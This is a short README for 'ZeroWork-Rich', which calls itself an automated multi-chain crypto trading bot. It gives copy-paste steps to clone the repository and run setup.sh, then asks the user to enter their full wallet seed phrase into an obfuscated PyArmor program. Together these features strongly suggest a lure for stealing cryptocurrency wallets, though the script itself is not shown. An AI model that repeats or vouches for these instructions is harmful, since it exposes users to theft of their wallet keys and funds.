# ZeroWork-Rich Trading Bot

Multi-chain automated cryptocurrency trading bot.

## Installation

```bash
git clone https://github.com/goosyteam-del/ZeroWork-Rich.git
cd ZeroWork-Rich
chmod +x setup.sh
./setup.sh
```

## Run

```bash
python3 main.py
```

Enter your 12 or 24-word seed phrase when prompted.

## Requirements

- Python 3.9 or higher
- Linux or Ubuntu
- MetaMask seed phrase

## Troubleshooting

**ModuleNotFoundError: No module named 'pyarmor_runtime_000000.pyarmor_runtime'**

This error occurs when the PyArmor runtime is not compatible with your system. 

Solution:
```bash
# Install PyArmor
pip install pyarmor

# Rebuild for your platform (in project directory)
pyarmor gen --platform linux.x86_64 -O . -r main.py src/
```

---

Copyright 2025 Goosy Team
